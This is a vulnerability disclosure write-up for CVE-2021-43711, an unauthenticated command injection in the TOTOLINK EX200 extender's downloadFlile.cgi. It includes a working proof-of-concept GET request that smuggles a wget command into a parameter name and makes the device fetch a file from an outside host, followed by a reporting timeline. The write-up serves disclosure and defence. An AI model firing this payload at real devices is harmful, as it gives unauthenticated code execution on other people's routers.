# ToTolink EX200 Comand Injection

#### Venda && Firmware_link

ToTolink EX200 http://totolink.net/home/menu/detail/menu_listtpl/download/id/144/ids/36.html

link :http://totolink.net/data/upload/20210428/7979e841521515eb83b45aacf5b67f9a.zip

Firmware_link :V4.0.3c.7646_B20201211

#### Describe

​	 The downloadFlile.cgi binary file has a command injection vulnerability when receiving GET parameters. The parameter name can be constructed for unauthenticated command execution

<img src="./img/image-20211020110137084.png" alt="image-20211020110137084" style="zoom:50%;" />


​	In the downloadFile cgi program, the QUERY_STRING environment parameter variable is the content of the GET request, so the parameter name can be controlled for command injection

#### POC

```
GET /cgi-bin/downloadFlile.cgi?;wget${IFS}http://192.168.0.111:801/mm.txt;=hahah HTTP/1.1

Host: 192.168.0.254

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

#### TEXT

​	 Listen to port 801 locally, and the browser accesses the following URL 

<img src="./img/image-20211020114318773.png" alt="image-20211020114318773" style="zoom:50%;" />

​	can see that the wireless extender has successfully connected to the local port 801

<img src="./img/image-20211020114301709.png" alt="image-20211020114301709" style="zoom:50%;" />

#### Reporting process

##### 2021.10.20 found this vuln

##### 2021.10.22 apply for vender

##### 2021.11.03 fix vuln 

The manufacturer's email indicates that the vulnerability has been fixed, but maybe can't issue an announcement

##### 2021.11.11 public this vuln

### CVE-2021-43711
link:  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43711
